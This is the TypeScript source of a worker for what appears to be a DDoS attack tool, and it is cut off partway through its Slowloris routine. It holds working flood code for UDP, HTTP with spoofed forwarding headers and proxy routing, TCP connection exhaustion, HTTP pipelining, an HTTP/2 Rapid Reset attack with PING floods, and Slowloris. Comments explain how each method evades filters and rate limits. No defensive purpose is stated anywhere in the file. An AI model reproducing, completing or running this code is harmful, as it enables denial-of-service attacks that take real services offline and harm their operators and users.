/**
 * ATTACK WORKER — runs in a worker_thread, owns its own event loop
 *
 * Receives attack config via workerData, fires all vectors,
 * and posts stats back to parent every 300ms.
 * Stops when parent sends "stop" message.
 */
import { parentPort, workerData } from "worker_threads";
import net from "node:net";
import tls from "node:tls";
import http from "node:http";
import https from "node:https";
import dgram from "node:dgram";
import dns from "node:dns/promises";

// ── Global agents — unlimited sockets, no pooling overhead ────────────────
// Using dedicated agents per request to avoid any per-host connection cap
// (undici/fetch pools to ≤128 connections per origin; http.Agent has no such cap)
const HTTP_AGENT  = new http.Agent({ maxSockets: Infinity, keepAlive: false, scheduling: "lifo" });
const HTTPS_AGENT = new https.Agent({ maxSockets: Infinity, keepAlive: false, rejectUnauthorized: false, scheduling: "lifo" });

// ── Types ─────────────────────────────────────────────────────────────────
interface ProxyConfig { host: string; port: number; }
interface WorkerConfig {
  method:   string;
  target:   string;
  port:     number;
  threads:  number;    // this worker's share of total threads
  proxies?: ProxyConfig[];
}

// ── Helpers ───────────────────────────────────────────────────────────────
const randInt  = (a: number, b: number) => a + Math.floor(Math.random() * (b - a));
const randStr  = (n: number) => Math.random().toString(36).slice(2, 2 + n);
const randIp   = () => `${1+randInt(0,223)}.${randInt(0,254)}.${randInt(0,254)}.${1+randInt(0,253)}`;
const randHex  = (n: number) => Array.from({length:n}, () => (Math.random()*16|0).toString(16)).join("");
const UA_POOL  = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:126.0) Gecko/20100101 Firefox/126.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
  "curl/8.7.1", "python-requests/2.32.3", "Go-http-client/2.0",
  "axios/1.7.2", "node-fetch/3.3.2",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
];
const randUA   = () => UA_POOL[randInt(0, UA_POOL.length)];
const HOT_PATHS = [
  "/", "/search", "/api/", "/api/v1/", "/api/v2/", "/login", "/admin/",
  "/wp-admin/", "/wp-login.php", "/dashboard", "/graphql", "/api/graphql",
  "/checkout", "/cart", "/account", "/profile", "/orders", "/products",
  "/api/auth/login", "/api/users", "/api/search", "/wp-json/wp/v2/posts",
  "/sitemap.xml", "/robots.txt", "/.env", "/config", "/api/health",
];
const hotPath = () => HOT_PATHS[randInt(0, HOT_PATHS.length)];

// DNS resolution cache
const dnsCache = new Map<string, string>();
async function resolveHost(hostname: string): Promise<string> {
  if (dnsCache.has(hostname)) return dnsCache.get(hostname)!;
  try {
    const [ip] = await dns.resolve4(hostname);
    dnsCache.set(hostname, ip);
    return ip;
  } catch { return hostname; }
}

// ── Headers builder ───────────────────────────────────────────────────────
function buildHeaders(isPost: boolean, bodyLen?: number): Record<string, string> {
  const cookieCount = randInt(8, 20);
  const cookie = Array.from({length: cookieCount}, () =>
    `${randStr(randInt(4,10))}=${randStr(randInt(16,64))}`
  ).join("; ");

  const h: Record<string, string> = {
    "User-Agent":           randUA(),
    "Accept":               randInt(0,2) === 0 ? "*/*" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language":      ["en-US,en;q=0.9","en-GB,en;q=0.8","fr-FR,fr;q=0.9","de-DE,de;q=0.9"][randInt(0,4)],
    "Accept-Encoding":      "gzip, deflate, br, zstd",
    "Cache-Control":        "no-cache, no-store, must-revalidate",
    "Pragma":               "no-cache",
    "Connection":           Math.random() < 0.6 ? "close" : "keep-alive",
    "X-Forwarded-For":      `${randIp()}, ${randIp()}, ${randIp()}, ${randIp()}`,
    "X-Real-IP":            randIp(),
    "True-Client-IP":       randIp(),
    "CF-Connecting-IP":     randIp(),
    "X-Originating-IP":     randIp(),
    "X-Remote-IP":          randIp(),
    "Forwarded":            `for=${randIp()};proto=https`,
    "Cookie":               cookie,
    "Authorization":        `Bearer eyJ${randHex(40)}.eyJ${randHex(60)}.${randHex(40)}`,
    "X-CSRF-Token":         randHex(32),
    "X-Request-ID":         `${randHex(8)}-${randHex(4)}-${randHex(4)}-${randHex(4)}-${randHex(12)}`,
    "Referer":              `https://${["google.com","bing.com","duckduckgo.com","yahoo.com","t.co"][randInt(0,5)]}/search?q=${randStr(randInt(4,12))}`,
    "Sec-Fetch-Dest":       "document",
    "Sec-Fetch-Mode":       "navigate",
    "Sec-Fetch-Site":       "cross-site",
    "Sec-CH-UA":            `"Chromium";v="125", "Not.A/Brand";v="24"`,
    "Sec-CH-UA-Platform":   `"Windows"`,
  };
  if (isPost && bodyLen !== undefined) {
    h["Content-Type"]   = randInt(0,2) === 0 ? "application/x-www-form-urlencoded" : "application/json";
    h["Content-Length"] = String(bodyLen);
  }
  return h;
}

function buildUrl(base: string): string {
  try {
    const u = new URL(base);
    if (Math.random() < 0.65) u.pathname = hotPath();
    else {
      const depth = randInt(1, 5);
      u.pathname = "/" + Array.from({length:depth}, () => randStr(randInt(3,10))).join("/");
    }
    u.searchParams.set("_",    Date.now().toString(36) + randStr(6));
    u.searchParams.set("v",    String(randInt(1, 99999999)));
    u.searchParams.set("cb",   String(Math.random()));
    if (Math.random() < 0.45) u.searchParams.set("q",   randStr(randInt(4,18)));
    if (Math.random() < 0.3)  u.searchParams.set("page", String(randInt(1, 100)));
    if (Math.random() < 0.2)  u.searchParams.set("id",  String(randInt(1, 999999)));
    return u.toString();
  } catch {
    return `${base}?_=${randStr(8)}&v=${Date.now()}`;
  }
}

function buildBody(minF = 30, maxF = 100): string {
  if (Math.random() < 0.4) {
    // JSON body — harder to filter than form-encoded
    const obj: Record<string, string | number> = {};
    for (let i = 0; i < randInt(minF, maxF); i++) {
      obj[randStr(randInt(4,10))] = randInt(0, 2) === 0 ? randInt(0, 999999) : randStr(randInt(8,48));
    }
    return JSON.stringify(obj);
  }
  return Array.from({length: randInt(minF, maxF)},
    () => `${randStr(randInt(4,10))}=${randStr(randInt(8,56))}`
  ).join("&");
}

// Pre-built heavy body pool (10-64KB each, rebuilt continuously)
const HEAVY_POOL: string[] = [];
function buildHeavy(): string {
  const target = randInt(10240, 65536);
  const isJson = Math.random() < 0.35;
  if (isJson) {
    const arr: string[] = ["{"];
    let len = 1;
    while (len < target) {
      const k = randStr(randInt(4,10));
      const v = randStr(randInt(40,120));
      const part = `"${k}":"${v}",`;
      arr.push(part);
      len += part.length;
    }
    arr.push(`"_":"${randHex(8)}"}`);
    return arr.join("");
  }
  const parts: string[] = [];
  let len = 0;
  while (len < target) {
    const p = `${randStr(randInt(4,10))}=${randStr(randInt(40,120))}`;
    parts.push(p);
    len += p.length + 1;
  }
  return parts.join("&");
}
for (let i = 0; i < 32; i++) HEAVY_POOL.push(buildHeavy());
setInterval(() => {
  HEAVY_POOL[randInt(0, HEAVY_POOL.length)] = buildHeavy();
}, 2000);
const getHeavy = () => HEAVY_POOL[randInt(0, HEAVY_POOL.length)];

// ─────────────────────────────────────────────────────────────────────────
//  REAL UDP FLOOD
//
//  CRITICAL: concurrent socket.send() startup deadlocks in this env.
//  Sockets must be bound SEQUENTIALLY, then all run in parallel.
//
//  Achieves 130K – 500K packets/second per worker.
// ─────────────────────────────────────────────────────────────────────────
async function runUDPFlood(
  resolvedHost: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // Sockets start SEQUENTIALLY (bind → sendNext → then next socket) to prevent bind() race.
  // Once all bound, they all fire in parallel. Up to 32 sockets on 8vCPU deployment.
  const numSockets = Math.max(1, Math.min(threads, 32));
  // Hit multiple ports to bypass single-port firewall rules
  const PORTS = [
    targetPort, targetPort, targetPort, // weight target port 3x
    53, 80, 443, 123, 161, 1900, 11211, 6881, 8080, 8443,
  ];
  const PKT_MIN = 512, PKT_MAX = 1472; // Ethernet MTU — maximize per-packet payload

  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const MAX_INFLIGHT = Math.min(threads * 10, 400); // 32GB: up to 400 inflight datagrams per socket

  const socketDonePromises: Promise<void>[] = [];

  // Start each socket SEQUENTIALLY (bind → sendNext → start next socket)
  for (let _s = 0; _s < numSockets; _s++) {
    await new Promise<void>((bindReady) => {
      const socketDone = new Promise<void>((resolve) => {
        const sock = dgram.createSocket("udp4"); // simple string — proven stable
        sock.on("error", () => {}); // absorb all errors

        let inflight = 0;
        let closed = false;

        const forceClose = () => {
          if (!closed) {
            closed = true;
            try { sock.close(); } catch { /**/ }
            resolve();
          }
        };

        const sendNext = () => {
          if (closed) return;
          if (signal.aborted && inflight === 0) { forceClose(); return; }
          while (!closed && !signal.aborted && inflight < MAX_INFLIGHT) {
            const port   = PORTS[randInt(0, PORTS.length)];
            const pktLen = randInt(PKT_MIN, PKT_MAX);
            const buf    = Buffer.allocUnsafe(pktLen);
            // Randomize content to defeat payload-based filtering
            buf.writeUInt32BE(Date.now() >>> 0, 0);
            buf.writeUInt32BE(randInt(0, 0xFFFFFFFF) >>> 0, 4);
            inflight++;
            sock.send(buf, 0, pktLen, port, resolvedHost, (_err) => {
              inflight--;
              localPkts++;
              localBytes += pktLen;
              sendNext();
            });
          }
        };

        signal.addEventListener("abort", () => {
          setTimeout(forceClose, 300);
        }, { once: true });

        sock.bind(0, () => {
          sendNext();
          bindReady();
        });
      });
      socketDonePromises.push(socketDone);
    });
  }

  await Promise.all(socketDonePromises);
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  PROXY REQUEST — routes HTTP through a proxy using native node:http
//  Supports: HTTP targets (absolute URL) and HTTPS (CONNECT tunnel)
// ─────────────────────────────────────────────────────────────────────────
function fetchViaProxy(
  targetUrl: string, proxy: ProxyConfig,
  reqMethod: string, headers: Record<string,string>, body?: string
): Promise<number> {
  return new Promise((resolve) => {
    const timeoutMs = 5000;
    const u = new URL(targetUrl);
    const isHttps = u.protocol === "https:";
    const targetHost = u.hostname;
    const targetPort = parseInt(u.port, 10) || (isHttps ? 443 : 80);
    const reqPath = (u.pathname || "/") + (u.search || "");
    const bodyBuf = body ? Buffer.from(body) : undefined;

    const finish = (bytes: number) => resolve(bytes);
    const fail   = ()             => resolve(100);

    if (!isHttps) {
      // HTTP through proxy — send absolute URL
      const absHeaders = Object.assign({}, headers, {
        Host: targetHost,
        "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
      } as Record<string, string | undefined>);
      // Remove undefined
      for (const k of Object.keys(absHeaders)) if (absHeaders[k] === undefined) delete absHeaders[k];

      const req = http.request({
        host: proxy.host, port: proxy.port,
        method: reqMethod, path: targetUrl,
        headers: absHeaders as Record<string,string>,
        timeout: timeoutMs,
      }, (res) => {
        const bytes = parseInt(res.headers["content-length"] || "0") || 450;
        res.resume();
        finish((bodyBuf?.length ?? 0) + bytes + 200);
      });
      req.on("error", fail);
      req.on("timeout", () => { req.destroy(); fail(); });
      if (bodyBuf) req.write(bodyBuf);
      req.end();
    } else {
      // HTTPS through CONNECT tunnel
      const sock = net.createConnection(proxy.port, proxy.host);
      const timer = setTimeout(() => { sock.destroy(); fail(); }, timeoutMs);

      sock.once("connect", () => {
        sock.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nProxy-Connection: keep-alive\r\n\r\n`);
        sock.once("data", (chunk) => {
          if (!chunk.toString().startsWith("HTTP/1.") || !chunk.toString().includes(" 200")) {
            clearTimeout(timer); sock.destroy(); fail(); return;
          }
          // Upgrade to TLS over the tunnel
          const secure = tls.connect({ socket: sock, servername: targetHost, rejectUnauthorized: false }, () => {
            const h = Object.assign({}, headers, {
              Host: targetHost,
              "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
            } as Record<string, string | undefined>);
            for (const k of Object.keys(h)) if (h[k] === undefined) delete h[k];
            const hdStr = Object.entries(h).map(([k,v]) => `${k}: ${v}`).join("\r\n");
            const req   = `${reqMethod} ${reqPath} HTTP/1.1\r\n${hdStr}\r\nConnection: close\r\n\r\n`;
            secure.write(req);
            if (bodyBuf) secure.write(bodyBuf);
            secure.once("data", (d) => {
              clearTimeout(timer); secure.destroy();
              finish((bodyBuf?.length ?? 0) + d.length + 200);
            });
            secure.once("error", () => { clearTimeout(timer); fail(); });
          });
          secure.on("error", () => { clearTimeout(timer); fail(); });
        });
        sock.on("error", () => { clearTimeout(timer); fail(); });
      });
      sock.on("error", () => { clearTimeout(timer); fail(); });
    }
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP FLOOD — maximum concurrency using http.request (NOT fetch/undici)
//
//  fetch() internally uses undici which caps connections per origin.
//  http.request() with a per-request agent has NO such cap — we can open
//  tens of thousands of concurrent TCP connections limited only by FDs.
//
//  Fire-and-forget: connection is destroyed the moment the response starts
//  arriving. The server is forced to allocate a thread/goroutine, parse
//  the request headers, and begin processing — then we drop the socket.
//
//  Achieves 8,000–40,000 req/s per worker depending on target RTT.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPFlood(
  base: string,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `http://${base}`); }
    catch { return new URL("http://127.0.0.1"); }
  })();
  const isHttps  = u.protocol === "https:";
  const hostname = u.hostname;
  const tgtPort  = parseInt(u.port) || (isHttps ? 443 : 80);
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);

  const ALL_METHODS = ["GET","GET","GET","GET","GET","POST","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
  // Much higher inflight — we have 83K FDs available
  const MAX_INFLIGHT = Math.min(threads * 50, 40000);
  let inflight = 0;
  let proxyIdx = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doRequest = () => {
    if (signal.aborted) return;
    inflight++;

    const method  = ALL_METHODS[randInt(0, ALL_METHODS.length)];
    const hasBody = method === "POST" || method === "PUT" || method === "PATCH";
    const body    = hasBody ? (Math.random() < 0.25 ? getHeavy() : buildBody(30, 120)) : undefined;
    const bodyBuf = body ? Buffer.from(body) : undefined;
    const url     = buildUrl(base);
    const headers = buildHeaders(hasBody, bodyBuf?.length);

    // Route through proxy pool when available
    const useProxy = proxies.length > 0 && Math.random() < 0.5;
    if (useProxy) {
      const proxy = proxies[proxyIdx % proxies.length];
      proxyIdx++;
      fetchViaProxy(url, proxy, method, headers as Record<string, string>, body)
        .then(bytes => { inflight--; localPkts++; localBytes += bytes; })
        .catch(() => { inflight--; localPkts++; localBytes += 100; });
      return;
    }

    // Direct http.request — bypasses undici, uses our unlimited http.Agent
    const reqPath = (() => {
      try { const pu = new URL(url); return pu.pathname + pu.search; }
      catch { return "/" }
    })();

    const reqOpts: http.RequestOptions | https.RequestOptions = {
      hostname:          resolvedIp,          // pre-resolved — skip DNS each time
      port:              tgtPort,
      path:              reqPath,
      method,
      headers: {
        ...headers,
        Host:            hostname,            // correct Host for virtual-hosting
        Connection:      "close",             // force new TCP — exhausts connection state
        "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
      } as Record<string, string>,
      agent: isHttps ? HTTPS_AGENT : HTTP_AGENT,
      timeout: 600,                           // 600ms — fast recycling
      ...(isHttps ? { servername: hostname, rejectUnauthorized: false } : {}),
    };

    const req = (isHttps ? https : http).request(reqOpts, (res) => {
      inflight--;
      localPkts++;
      localBytes += (bodyBuf?.length ?? 0) + (parseInt(String(res.headers["content-length"] || "0")) || 400) + 200;
      res.destroy(); // fire-and-forget: don't read body, release socket NOW
    });

    req.on("error",   () => { inflight--; localPkts++; localBytes += 80; });
    req.on("timeout", () => { req.destroy(); });

    if (bodyBuf) req.write(bodyBuf);
    req.end();
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doRequest(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 0));
    }
  };

  // 500 concurrent launcher coroutines — each fills the inflight queue
  await Promise.all(Array.from({ length: Math.min(threads, 500) }, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  TCP FLOOD — exhausts connection state tables
// ─────────────────────────────────────────────────────────────────────────
async function runTCPFlood(
  resolvedHost: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // Rotate ports to stress multiple listeners simultaneously
  const PORTS = [
    targetPort, targetPort, targetPort, // weight target port
    targetPort === 443 ? 80 : 443,
    8080, 8443, 3000, 5000, 8000, 8888,
  ];
  const MAX_INFLIGHT = Math.min(threads * 15, 8000);
  let inflight = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doConnect = () => {
    if (signal.aborted) return;
    inflight++;
    const p    = PORTS[randInt(0, PORTS.length)];
    const sock = net.createConnection({ host: resolvedHost, port: p });
    sock.setNoDelay(true);
    sock.setTimeout(600);

    const kill = setTimeout(() => { sock.destroy(); inflight--; }, 800);

    sock.once("connect", () => {
      localPkts++;
      // Send a partial/malformed HTTP request to keep the server busy
      const req  = `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1,9999999)} HTTP/1.1\r\nHost: ${resolvedHost}\r\nUser-Agent: ${randUA()}\r\nX-Forwarded-For: ${randIp()}\r\nConnection: keep-alive\r\n`;
      const junk = Buffer.allocUnsafe(randInt(256, 1500));
      // Fill junk with random bytes
      for (let i = 0; i < junk.length; i += 4) junk.writeUInt32LE(Math.random() * 0xFFFFFFFF | 0, i);
      sock.write(Buffer.concat([Buffer.from(req), junk]), () => {
        localBytes += req.length + junk.length + 60;
        clearTimeout(kill);
        inflight--;
        sock.destroy();
      });
    });
    sock.once("error",   () => { localPkts++; localBytes += 20; clearTimeout(kill); inflight--; });
    sock.once("timeout", () => { clearTimeout(kill); inflight--; sock.destroy(); });
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doConnect(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 1));
    }
  };

  await Promise.all(Array.from({length: Math.min(threads, 150)}, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP PIPELINE — raw TCP keep-alive, NO fetch() overhead
//
//  Each connection stays open and sends requests back-to-back without
//  waiting for responses (HTTP/1.1 pipelining — RFC 7230 §6.3.2).
//  The receive side is drained so flow control never blocks.
//
//  Achieves 50K – 300K req/s per worker depending on target RTT.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPPipeline(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const POOL_SIZE = 256;
  const PIPELINE  = 128; // requests per write batch — more per tick for max throughput

  // Pre-build a pool of raw HTTP request buffers
  const reqPool: Buffer[] = Array.from({ length: POOL_SIZE }, () => buildRawReq(hostname));

  function buildRawReq(host: string): Buffer {
    const path = hotPath() + `?_=${randStr(10)}&v=${randInt(1, 999999999)}&cb=${Math.random().toString(36).slice(2,8)}`;
    return Buffer.from([
      `GET ${path} HTTP/1.1`,
      `Host: ${host}`,
      `User-Agent: ${randUA()}`,
      `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
      `Accept-Encoding: gzip, deflate, br`,
      `Accept-Language: en-US,en;q=0.9`,
      `X-Forwarded-For: ${randIp()}, ${randIp()}, ${randIp()}`,
      `X-Real-IP: ${randIp()}`,
      `CF-Connecting-IP: ${randIp()}`,
      `X-Request-ID: ${randHex(16)}`,
      `Cache-Control: no-cache, no-store`,
      `Pragma: no-cache`,
      `Referer: https://google.com/search?q=${randStr(8)}`,
      `Connection: keep-alive`,
      ``, ``,
    ].join("\r\n"));
  }

  // Refresh pool continuously — keeps paths/IPs/tokens fresh (evade caching/dedup)
  const poolIv = setInterval(() => {
    const idx = randInt(0, POOL_SIZE);
    reqPool[idx] = buildRawReq(hostname);
  }, 40);

  const useHttps = targetPort === 443;

  const runConn = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    let sock: net.Socket;
    if (useHttps) {
      sock = tls.connect({
        host: resolvedHost, port: targetPort,
        servername: hostname, rejectUnauthorized: false,
      });
    } else {
      sock = net.createConnection({ host: resolvedHost, port: targetPort });
    }
    sock.setNoDelay(true);
    sock.setTimeout(12_000);

    const pump = () => {
      if (signal.aborted) { sock.destroy(); resolve(); return; }
      let ok = true;
      for (let i = 0; i < PIPELINE; i++) {
        const buf = reqPool[randInt(0, POOL_SIZE)];
        localPkts++;
        localBytes += buf.length;
        ok = sock.write(buf);
        if (!ok) break; // backpressure — wait for drain
      }
      if (ok) setImmediate(pump); // setImmediate instead of setTimeout for max throughput
      else sock.once("drain", pump);
    };

    const startPump = () => pump();
    if (useHttps) {
      (sock as tls.TLSSocket).once("secureConnect", startPump);
    } else {
      sock.once("connect", startPump);
    }
    sock.on("data",    () => {}); // drain responses — keeps TCP window open
    sock.on("timeout", () => sock.destroy());
    sock.on("error",   () => resolve());
    sock.on("close",   () => {
      if (signal.aborted) resolve();
      else setTimeout(() => runConn().then(resolve), 10); // reconnect with tiny delay
    });
    signal.addEventListener("abort", () => { sock.destroy(); resolve(); }, { once: true });
  });

  // Each thread maintains one persistent pipelining connection
  await Promise.all(Array.from({ length: Math.min(threads, 800) }, () => runConn()));
  clearInterval(flushIv);
  clearInterval(poolIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP/2 FLOOD — native multiplexed H2 streams (node:http2)
//
//  Each session holds up to STREAMS_PER_SESSION concurrent H2 streams, all
//  over a single TCP+TLS connection. Far more efficient per-socket than HTTP/1.1
//  pipelining since H2 uses binary framing with true stream multiplexing.
//
//  Achieves 20K–120K req/s per worker at close RTTs.
// ─────────────────────────────────────────────────────────────────────────
async function runHTTP2Flood(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const { connect: h2connect, constants: h2constants } = await import("node:http2");

  // 32GB RAM / 8 vCPU optimized: each H2 session ~150KB (V8 + TLS + nghttp2 state)
  // 500 sessions × 150KB = 75MB — trivial on 32GB. CVE-2023-44487 saturates at ~500 concurrent.
  // Max streams per session raised to 512 — more RST+PING work forced per session per burst.
  const STREAMS_PER_SESSION = Math.min(512, Math.max(32, threads * 3)); // was 256
  const NUM_SESSIONS        = Math.min(threads, 500);                   // was 200
  const connectTarget       = `https://${resolvedHost}:${targetPort}`;

  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  // ── Persistent session loop — restarts until signal aborted ────────────
  // Previous bug: recursive runSession().then(finish) caused the Promise.all
  // to resolve when CF rejected new connections, halting H2 pressure at ~18s.
  // Fix: each session slot loops independently in a while(!aborted) loop.
  const runSessionSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          c = h2connect(connectTarget, {
            rejectUnauthorized: false,
            settings: {
              initialWindowSize:    65535 * 8,
              maxConcurrentStreams: STREAMS_PER_SESSION,
              headerTableSize:      65536,
            },
          });
        } catch { resolve(); return; }

        const conn = c;
        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };

        let pumpCount = 0;
        const pump = () => {
          if (signal.aborted || conn.destroyed) { resolve(); return; }
          for (let burst = 0; burst < 64 && !signal.aborted && !conn.destroyed; burst++) {
            const path = hotPath() + `?_=${randStr(8)}&v=${randInt(1, 9999999)}&t=${Date.now().toString(36)}`;
            try {
              const stream = conn.request({
                ":method":         Math.random() < 0.7 ? "GET" : "POST",
                ":path":           path,
                ":scheme":         "https",
                ":authority":      hostname,
                "user-agent":      randUA(),
                "accept":          "*/*,text/html,application/xhtml+xml",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "x-forwarded-for": `${randIp()}, ${randIp()}, ${randIp()}`,
                "x-real-ip":       randIp(),
                "cf-connecting-ip":randIp(),
                "cache-control":   "no-cache, no-store, must-revalidate",
                "pragma":          "no-cache",
                "referer":         `https://www.google.com/search?q=${randStr(6)}`,
                "x-request-id":    `${randHex(8)}-${randHex(4)}-${randHex(12)}`,
                "cookie":          `session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
              });
              // ★ THE RAPID RESET: Immediately RST_STREAM after HEADERS
              // Server MUST allocate resources before seeing RST — wasted work.
              stream.close(h2constants.NGHTTP2_NO_ERROR);
              localPkts++;
              localBytes += 400;
              stream.on("error", () => { /**/ });
            } catch { break; }
          }
          // ★ PING FLOOD: every 4 bursts (≈256 RST streams) inject 12 PING frames.
          // RFC 7540 §6.7: server MUST send PING ACK for every PING received.
          // 12 mandatory ACKs per 256 RST_STREAMs compounds CPU: server is
          // simultaneously processing RST queue + generating ACK responses.
          pumpCount++;
          if (pumpCount % 4 === 0 && !conn.destroyed) {
            for (let p = 0; p < 12; p++) {
              try {
                const pingData = Buffer.allocUnsafe(8);
                pingData.writeUInt32BE(randInt(0, 0x7fffffff), 0);
                pingData.writeUInt32BE(randInt(0, 0x7fffffff), 4);
                conn.ping(pingData, () => { /* ACK received — we don't care, server had to work */ });
              } catch { /**/ }
            }
            localPkts += 12; localBytes += 12 * 17; // 9-byte frame header + 8-byte payload each
          }
          if (!signal.aborted && !conn.destroyed) setImmediate(pump);
        };

        conn.on("connect", () => { pump(); });
        conn.on("error",   () => { resolve(); }); // will restart in next while iteration
        conn.on("close",   () => { resolve(); }); // will restart in next while iteration
        signal.addEventListener("abort", cleanup, { once: true });
      });
      // Brief pause before reconnect — avoid thundering herd on CF rate limits
      if (!signal.aborted) await new Promise(r => setTimeout(r, 150 + randInt(0, 100)));
    }
  };

  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSessionSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SLOWLORIS — real TCP connection pool exhaustion
//
//  Opens thousands of half-open HTTP connections. Each sends a partial request
//  (no final \r\n\r\n), then trickles one fake header line every 10-25s to
//  keep the connection alive without triggering timeouts.
//
//  Exhausts the server's connection pool without sending meaningful traffic.
//  Bypasses per-request rate limits — one connection per server thread slot.
//
//  Achieves 2K–8K concurrent half-open connections.
// ─────────────────────────────────────────────────────────────────────────
async function runSlowlorisReal(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
  useHttps = false,
): Promise<void> {
  // 80 connections per thread — trickle headers every 10-25s, starves server thread pool
  // DEV cap: container limit ~4GB; PROD (32GB): full 20K sockets
  const IS_DEV = process.env.NODE_ENV !== "production";
  const MAX_CONN = IS_DEV
    ? Math.min(threads * 8, 800)            // dev: max 800 sockets (~64MB TLS)
    : Math.min(threads * 120, 50000);       // prod: 50K sockets × 80KB TLS = 4GB (32GB avail)
  let localPkts = 0, localBytes = 0, activeConns = 0;
  const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 250);

  const runSock = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    // Use TLS for HTTPS targets — plain TCP is rejected by nginx on port 443
    const sock: net.Socket = useHttps
      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
      : net.createConnection({ host: resolvedHost, port: targetPort });

    sock.setNoDelay(true);
    sock.setTimeout(180_000); // 3-minute timeout — keep alive

    let keepIv:  NodeJS.Timeout | null = null;
    let settled  = false;

    const cleanup = () => {
      if (settled) return;
      activeConns = Math.max(0, activeConns - 1);
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (signal.aborted) { settled = true; resolve(); return; }
      // Immediately respawn to maintain connection count
      settled = true;
      setImmediate(() => runSock().then(resolve));
    };

    const onConnected = () => {
      activeConns++;
      localPkts++;

      // ★ DUAL-MODE SLOWLORIS:
      // 60% classic GET Slowloris (missing final \r\n\r\n — server waits for request completion)
      // 40% POST Slowloris (sends huge Content-Length, server waits for body to arrive byte by byte)
      //
